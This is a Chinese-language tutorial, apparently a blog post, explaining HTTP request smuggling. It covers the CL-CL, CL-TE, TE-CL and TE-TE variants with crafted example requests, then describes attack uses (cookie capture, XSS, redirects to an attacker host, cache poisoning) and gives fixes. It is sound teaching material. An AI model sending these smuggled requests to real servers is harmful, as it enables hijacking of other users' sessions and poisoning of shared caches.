# HTTP请求走私

## 概述

在复杂的网络环境下，不同的服务器对RFC( Request For Comments )标准实现的方式不同，程度不同。这样一来，对同一个HTTP请求，不同的服务器可能会产生不同的处理结果，这样就会产生安全风险。



HTTP有着无连接这个重要的特性，它是应用层的协议，在传输层使用的是TCP协议。

无连接是指每次发送HTTP 请求，都需要建立一次TCP链接，但这会造成网络的利用率比较低。

>现代的Web网络页面是由多种资源组成的，在浏览一个网页内容时，不仅要请求HTML文档，还有JS、CSS、图片等各种各样的资源。
>
>如果每次请求都需要建立一个TCP链接，当有大量用户同时发起请求的时候，便会给服务器造成很多不必要的消耗。

于是，从HTTP 1.1版本开始，增加了Keep-Alive和Pipeline两个特性。

### Keep-Alive

在 HTTP 协议中加了 **Connection: keep-alive** 这个请求头，告诉 Server 接受完这次HTTP请求后，不要关闭TCP链接，后续会复用这个链接。这样只需要一个TCP握手的过程，就可以发送多个文件，节约资源，还能加快访问的速度。当有请求带着 **Connection: close** 这个请求头后，在这次通信完成之后，服务器才会断开TCP链接。

如此解决了额外消耗的问题，但是服务器处理请求的方式依然是请求一次响应一次，然后再处理下一个请求。这中间还有着很大的时延消耗。为此提出了Pipelining解决这个问题。

### Pipelining

Pipelining 这个特性允许客户端在等待上一个报文回复的同时，发送下一个报文。这让客户端可以一次发送多个请求，服务器也可以一次接受多个请求，遵循先进先出的原则处理这些请求，再将响应发送给客户端。

 现在，浏览器默认不启用`Pipeline`的，但是一般的服务器都提供了对`Pipleline`的支持。 

​                                       ![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy83V2lhZkdVTlZ2eDQ2RXNPMkE5akgyU2puNVFGeFlMdEl6Q2w3M0MzUGY0Wmx0MHFjcWdlTW56cldPb2lidG12WlN4V0xkTFYzRU0zcXZsbHppYXZ6bnVFUS82NDA?x-oss-process=image/format,png) 

以上的两种特性节约了网络资源，提高了这些资源的利用效率。但是，这也有新的问题，那就是服务器要如何区分不同的请求报文。

关于如何界定数据包的边界，HTTP请求头中有两个文段，Content-Length 和 Transfer-Encoding。

#### Content-Length

简称 CL，是指请求体或者响应体的长度，用**十进制**来表示。

> POST / HTTP/1.1
> Host: test.com
> Content-Length: 44
>
> abcdowjncowmco kqmcoqkmcimpmqi 

如果 Content-Length 的值比实际长度小，会造成内容被截断；如果比实际长度大，服务器会一直等待后面的内容，直到超时。

#### Transfer-Encoding

简称 TE，有多个常见的值：

> Transfer-Encoding: chunked
>
> Transfer-Encoding: compress
>
> Transfer-Encoding: deflate
>
> Transfer-Encoding: gzip
>
> Transfer-Encoding: identity

HTTP请求走私中一般采用 chunked，即将消息正文使用分块编码。这时，报文中的实体需要改为用一系列分块来传输。每个分块包含**十六进制**的长度值和数据，长度值占一行，长度不包括结尾的换行符，也不包括分块数据结尾的换行符，但是包括分块中的换行，算2个值（\r\n)。

最后一个分块长度值必须为0，对应的分块数据没有内容，表示实体结束。

```http
Post /langdetect HTTP/ 1.1
Host: fanyi.baidu.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

2
ab
3
ery
1
=
2
ja
2
ck
0

```



这是两种表示报文长度的方式，而在一个报文段中，允许两种方式同时出现。且优先以**Transfer-Encoding**为准。

> 根据RFC标准，如果接收到的消息同时具有 **Content-Length** 和 **Transfer-Encoding** 两个字段，则必须忽略 **Content-Length** 字段，但是存在不遵循标准的例外。
>
> 根据标准，当接受到 **Transfer-Encoding**： chunked,error 这样有多个值或者不识别的值的时候，应该返回400错误。但存在一些方法可以绕过。

 

## 漏洞原理

HTTP 规范提供了两种不同的方式来指定请求结束的位置，当前/后端对于数据包边界的校验不一致时，会干扰正常的请求序列， 使得攻击者绕过安全控制，未经授权访问敏感数据，并直接危害其他应用程序用户。 

 ![从一道CTF题到HTTP请求走私攻击](https://pica.zhimg.com/v2-9e2923caf81a056845a1073d3a6e5590_1440w.jpg?source=172ae18b) 

同时使用两种不同的方法时，`Content-Length`无效。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为`Content-Length`的长度有效，有些以`Transfer-Encoding`有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求，从而导致HTTP请求走私漏洞 。

**RFC2616规范**

> 如果接收的消息同时包含传输编码头字段(Transfer-Encoding)和内容长度头(Content-Length)字段，则必须忽略后者。

由于规范默许可以使用`Transfer-Encoding`和`Content-Length`处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，将`Transfer-Encoding`隐藏在服务端的一个`chain`中时，它将会回退到使用`Content-Length`去发送请求。

**走私攻击实现**
当向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，代理服务器可能认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。

### 如何执行HTTP请求走私攻击

HTTP请求走私攻击涉及将`Content-Length`标头和`Transfer-Encoding`标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：

> CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。
> TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。
> TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。

### HTTP请求走私攻击的五种方式

#### CL不为0

所有不携带请求体的HTTP请求都有可能受此影响。这里用GET请求举例。
前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的`Content-Length`头，不进行处理。这就有可能导致请求走私。

**构造请求示例**：

```
GET / HTTP/1.1\r\n
Host: test.com\r\n
Content-Length: 44\r\n

GET /secret HTTP/1.1\r\n
Host: test.com\r\n
\r\n
```

> ```
> \r\n`是换行的意思，windows的换行是`\r\n`，unix的是`\n`，mac的是`\r
> ```

**攻击流程**：
前端服务器收到该请求，读取`Content-Length`，判断这是一个完整的请求。
然后转发给后端服务器，后端服务器收到后，因为它认为这是一个 Get 请求，因此它不对`Content-Length`进行处理，由于`Pipeline`性质的存在，后端服务器就认为这是收到了两个请求，分别是：

第一个：

```
GET / HTTP/1.1\r\n
Host: test.com\r\n
```

第二个：

```
GET /secret HTTP/1.1\r\n
Host: test.com\r\n
```

所以造成了请求走私。

#### CL-CL

**RFC7230规范**

> 在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个`Content-Length`，而且两者的值不同时，需要返回400错误。

有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。
但是中间代理服务器按照第一个`Content-Length`的值对请求进行处理，而后端源站服务器按照第二个`Content-Length`的值进行处理。
**构造请求示例**：

```
POST / HTTP/1.1\r\n
Host: test.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a
```

**攻击流程**：
中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。
而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母`a`，对于后端服务器来说，这个`a`是下一个请求的一部分，但是还没有传输完毕。
如果此时有一个其他的正常用户对服务器进行了请求：

```
GET /index.html HTTP/1.1\r\n
Host: test.com\r\n
```

因为代理服务器与源站服务器之间一般会重用TCP连接。所以正常用户的请求就拼接到了字母`a`的后面，当后端服务器接收完毕后，它实际处理的请求其实是：

```
aGET /index.html HTTP/1.1\r\n
Host: test.com\r\n
```

这时，用户就会收到一个类似于`aGET request method not found`的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且还可以扩展成类似于CSRF( Cross—Site Request Forgery )的攻击方式。

但是一般的服务器都不会接受这种存在两个请求头的请求包。该怎么办呢？
所以想到前面所说的
**RFC2616规范**

> 如果收到同时存在`Content-Length`和`Transfer-Encoding`这两个请求头的请求包时，在处理的时候必须忽略`Content-Length`。

所以请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。导致服务器在这里的实现更容易出问题。

#### CL-TE

CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理`Content-Length`请求头，而后端服务器会遵守`RFC2616`的规定，忽略掉`Content-Length`，处理`Transfer-Encoding`请求头。

**chunk传输数据(size的值由16进制表示)**

```
[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]
```

**构造请求示例**：

```
POST / HTTP/1.1\r\n
Host: test.com\r\n
......
Connection: keep-alive\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
a
```

连续发送几次请求就可以获得响应。
**攻击流程**：
由于前端服务器处理`Content-Length`，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是

```
0\r\n
\r\n
a
```

当请求包经过代理服务器转发给后端服务器时，后端服务器处理`Transfer-Encoding`，当它读取到

```
0\r\n
\r\n
```

认为已经读取到结尾了。
但剩下的字母`a`就被留在了缓冲区中，等待下一次请求。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求：

```
aPOST / HTTP/1.1\r\n
Host: test.com\r\n
......
```

服务器在解析时就会产生报错了，从而造成HTTP请求走私。

#### TE-CL

TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理`Transfer-Encoding`请求头，后端服务器处理`Content-Length`请求头。
**构造请求示例**：

```
POST / HTTP/1.1\r\n
Host: test.com\r\n
......
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
aPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
```

**攻击流程**：
前端服务器处理`Transfer-Encoding`，当其读取到

```
0\r\n
\r\n
```

认为是读取完毕了。
此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理`Content-Length`请求头，因为请求体的长度为`4`.也就是当它读取完

```
12\r\n
```

就认为这个请求已经结束了。后面的数据就认为是另一个请求：

```
aPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
```

成功报错，造成HTTP请求走私。

#### TE-TE

TE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理`Transfer-Encoding`请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的`Transfer-Encoding`进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理`Transfer-Encoding`请求头。在某种意义上这还是`CL-TE`或者`TE-CL`。
**构造请求示例**：

```
POST / HTTP/1.1\r\n
Host: test.com\r\n
......
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
5c\r\n
aPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

**攻击流程**：
前端服务器处理`Transfer-Encoding`，当其读取到

```
0\r\n
\r\n
```

认为是读取结束。
此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理`Transfer-encoding`请求头，将`Transfer-Encoding`隐藏在服务端的一个`chain`中时，它将会回退到使用`Content-Length`去发送请求。读取到

```
5c\r\n
```

认为是读取完毕了。后面的数据就认为是另一个请求：

```
aPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

成功报错，造成HTTP请求走私。

### 攻击思路

1. 用户劫持

   在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：

   * 描述TLS链接所使用的协议和密码
   * 包含用户IP地址的XFF头
   * 用户的会话令牌ID

   我们可以用三大步骤来获取这些信息

   > 1. 找一个能够将请求参数的值输出到响应中的POST请求
   > 2. 把该POST请求中，找到的这个特殊的参数放在消息的最后面
   > 3. 走私这个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显现出来 

   假设前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length字段，不进行处理，这就有可能导致请求走私。

   ```
   GET / HTTP/1.1
   Host: example.com
   Content-Length: 72
   
   POST /Comment HTTP/1.1
   Host: example.com
   Content-Length: 666
   
   mag=aaa
   ```

   前端服务器通过读取Content-Length，确认了这是一个完整的请求，然后转发到后端服务器，而后端服务器不对Content-Length进行判断，于是这在服务器中变成了两个请求。

   而第二个为POST请求，假定这是一个会将信息显示出来的请求，比如弹幕或者评论，再假定后端服务器会通过 Content-Length 来界定数据包。

   那么由于数据包的长度为666，那么服务器会等待后面的数据，等待正常用户的请求包到来，与其拼接，变为 mas=aaaGET / HTTP/1.1......，然后会将其显示在正常的页面上，导致用户的Cookie等信息发生泄露。

2. 配合 Reflected XSS 进行无交互XSS

   将 Reflected XSS走私到缓冲区，等待正常用户访问。

3. 恶意重定向

   > 许多应用程序执行从一个URL到另一个URL的重定向，会将来自请求的HOST标头的主机名放入重定向URL。

   ```
   请求
   GET /home HTTP/1.1
   Host: normal-website.com
   
   响应
   HTTP/1.1 301 Moved Permanently
   Location: https://normal-website.com/home/
   ```

   通常，这样的行为是无害的，但是可以在HTTP走私请求攻击中利用它来将用户重定向到外部域中。

   ```
   POST / HTTP/1.1
   Host: vulnerable-website.com
   content-Length: 54
   Transfer-Encoding: chunked
   
   0
   
   GET /home HTTP/1.1
   Host: attacker-website.com
   Foo: x
   ```

   走私的请求将触发重定向到攻击者的网站，这将影响后端服务器处理的下一个用户请求

   ```
   拼接后的正常请求
   GET /home HTTP/1.1
   Host: attacker-website.com
   Foo: xGET /scripts/include.js HTTP/1.1
   Host: vulnerable-website.com
   
   恶意响应
   HTTP/1.1 301 Moved Permanently
   Location: https://attacker-website.com/home/
   ```

   如果用户请求的是一个JavaScript文件，该文件是由网站上的页面导入的。攻击者可以通过在响应中返回恶意的JavaScript文件来完全破坏用户。

4. 缓存投毒

   一般来说，前端服务器由于性能原因，会对后端服务器的一些资源进行缓存，如果存在HTTP请求走私漏洞，则有可能使用重定向来进行缓存投毒，从而影响后续访问的所有用户。

### 漏洞修复

1、将前端服务器配置为只使用HTTP/2与后端系统通信
2、完全禁用后端连接重用来解决此漏洞的所有变体 
3、确保连接中的所有服务器运行具有相同配置的相同web服务器软件。
4、彻底拒绝模糊的请求，并删除关联的连接。